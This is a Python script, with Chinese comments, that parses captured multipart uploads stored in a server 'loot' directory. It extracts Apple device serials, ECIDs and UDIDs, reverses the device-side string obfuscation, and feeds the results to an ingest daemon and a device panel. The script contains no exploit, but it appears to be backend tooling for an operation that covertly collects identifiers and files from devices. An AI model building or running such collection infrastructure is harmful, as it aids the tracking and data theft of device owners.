#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""post_t_*.bin（/t core 采集通道 multipart）元数据解析器
扫 unknown_posts/post_t_*.bin → 解析 multipart 字段 → 生成 .parsed.json（幂等）
字段：idx/ftu/rid/b/c/s(serial hex)/d,f(ecid hex)/u(udid hex)/m/lhu/sig/file(名称+大小)
"""
import re, os, sys, json, glob, binascii
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from spool_hint import hint   # 【P2b】parsed.json 落地 → 提示 ingestd 入库

ROOT = '/www/wwwroot/i.131422.com/loot'
OUT_DIRS = [os.path.join(ROOT, 'unknown_posts')]
for d in glob.glob(os.path.join(ROOT, '*')):
    if os.path.isdir(d) and os.path.basename(d) not in ('unknown_posts',):
        OUT_DIRS.append(d)


def h2s(v):
    """hex 字符串 → ascii（失败则原值）"""
    try:
        if re.fullmatch(r'[0-9a-fA-F]+', v) and len(v) % 2 == 0:
            return binascii.unhexlify(v).decode('utf-8', 'replace')
    except Exception:
        pass
    return v


def parse_one(path):
    raw = open(path, 'rb').read()
    m = re.match(rb'--(Boundary-[0-9A-Fa-f\-]+)\r\n', raw)
    if not m:
        return None
    bnd = m.group(1)
    meta, file_info = {}, None
    for p in raw.split(b'--' + bnd):
        if not p.strip() or p.strip() == b'--':
            continue
        hm = re.match(rb'\r\nContent-Disposition: form-data; name="([^"]+)"(?:; filename="([^"]*)")?\r\n(?:Content-Type: ([^\r\n]+)\r\n)?\r\n', p)
        if not hm:
            continue
        name = hm.group(1).decode()
        fname = (hm.group(2) or b'').decode()
        body = p[hm.end():]
        if body.endswith(b'\r\n'):
            body = body[:-2]
        if name == 'file':
            file_info = {'filename': fname, 'size': len(body), 'crc_hex': body[:16].hex()}
        elif len(body) <= 256 and all(32 <= b < 127 or b in (9, 10, 13) for b in body):
            meta[name] = body.decode('utf-8', 'replace')
    if not meta and not file_info:
        return None
    serial_raw = h2s(meta.get('s', '')) if meta.get('s') else ''
    # ── 【2026-09-11 定案】/t 容器身份字段是【字符串倒序】写入的（设备端混淆）──
    #   实证（同一台设备 /t vs put 双向对照，且 15/15 台设备的 reverse(serial) 都能在本站数据里找到）：
    #     /t s="MYD0PXS5FQND" → 反转 "DNQF5SXP0DYM"  = put 上报的 s
    #     /t d="E100A3E0AA90A000"            → 反转 "000A09AA0E3A001E" = put 的 d
    #     /t u="E100A3E0AA90A000-10180000"   → 反转 "00008101-000A09AA0E3A001E" = put 的 u
    #     lhu / channel(c) 未反转（两边完全一致，可作为同一性判据）
    #   不归一化的后果：面板按序列号索引设备 → 每台 /t 设备多出一个"只有序列号、其它全空"的幽灵设备。
    rev = lambda v: v[::-1] if v else v
    serial_dev = rev(serial_raw)
    ecid_dev = rev(h2s(meta.get('d') or meta.get('f') or ''))
    udid_dev = rev(h2s(meta.get('u') or ''))
    serial_norm = serial_dev[:-3] if serial_dev.endswith('PND') else serial_dev
    out = {
        'source': os.path.basename(path),
        'ts': int(re.search(r'_(\d+)\.bin$', path).group(1)),
        'serial': serial_dev,               # 归一化后的真实序列号（面板按此归并到真设备）
        'serial_norm': serial_norm,
        'serial_sent': serial_raw,          # 容器里原始（倒序）值，留档备查
        'ecid': ecid_dev,
        'udid': udid_dev,
        'lhu': meta.get('lhu', ''),
        'rid': meta.get('rid', ''),
        'cidx': meta.get('idx', ''),
        'channel': meta.get('c', ''),
        'file': file_info,
        'raw_meta': meta,
    }
    return out


def main():
    force = '--force' in sys.argv
    n = 0
    for d in OUT_DIRS:
        for f in sorted(glob.glob(os.path.join(d, 'post_t_*.bin'))):
            outp = f + '.parsed.json'
            if os.path.exists(outp) and not force:
                continue
            try:
                o = parse_one(f)
                if not o:
                    continue
                json.dump(o, open(outp, 'w', encoding='utf-8'), ensure_ascii=False, indent=2)
                hint(os.path.basename(os.path.dirname(f)))   # 【P2b】parsed.json 落地 → 提示 ingestd
                n += 1
                if n <= 5:
                    print(f'[OK] {os.path.basename(f)} serial={o["serial"]} file={(o["file"] or {}).get("filename")} {(o["file"] or {}).get("size")}B')
            except Exception as e:
                print(f'[ERR] {f}: {e}')
    print(f'done, parsed={n}')


if __name__ == '__main__':
    if '--daemon' in sys.argv:
        # 【P4.1】常驻模式：循环扫描，parsed.json 落地即 hint → ingestd 秒级入库
        import time as _t
        _iv = float(os.environ.get('DAEMON_S', '20'))
        print('[daemon] parse_t_files 常驻启动 interval=%ss' % _iv, flush=True)
        while True:
            try:
                main()
            except Exception as _e:
                print('[daemon] error:', _e, flush=True)
            _t.sleep(_iv)
    else:
        main()
